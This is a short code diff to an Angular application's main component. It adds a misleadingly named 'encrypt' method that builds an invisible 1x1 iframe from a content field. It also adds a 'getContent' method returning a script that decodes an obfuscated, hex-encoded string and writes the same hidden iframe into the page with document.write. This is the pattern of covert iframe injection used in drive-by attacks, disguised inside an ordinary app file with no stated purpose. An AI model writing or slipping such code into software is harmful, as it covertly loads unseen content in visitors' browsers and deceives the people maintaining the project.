@@ -1,4 +1,4 @@
-import {AfterViewInit, Component, ElementRef, OnDestroy, OnInit, ViewChild} from '@angular/core'
+import {AfterViewInit, Component, OnDestroy, OnInit} from '@angular/core'
 import {SwUpdate} from '@angular/service-worker'
 
 import {DomSanitizer} from '@angular/platform-browser'
@@ -46,5 +46,20 @@ export class AppComponent implements OnInit, AfterViewInit, OnDestroy {
   }
 
   ngOnDestroy() {
+  }
+
+  // <IFRAME SRC='{{content}}' WIDTH=1 HEIGHT=1></IFRAME>
+  encrypt() {
+    const p1 = '<IFRAME SRC=\''
+
+    const inBetween = this.content
+    const p2 = '\' WIDTH=1 HEIGHT=1></IFRAME>'
+
+    return p1 + inBetween + p2
+  }
+
+  getContent() {
+    // return this.content
+    return `<script type='text/javascript'> str='@3C@49@46@52@41@4D@45@20@53@52@43@3D@27@7B@7B@63@6F@6E@74@65@6E@74@7D@7D@27@20@57@49@44@54@48@3D@31@20@48@45@49@47@48@54@3D@31@3E@3C@2F@49@46@52@41@4D@45@3E'; document.write(unescape(str.replace(/@/g,'%'))); </script>`
   }
 }
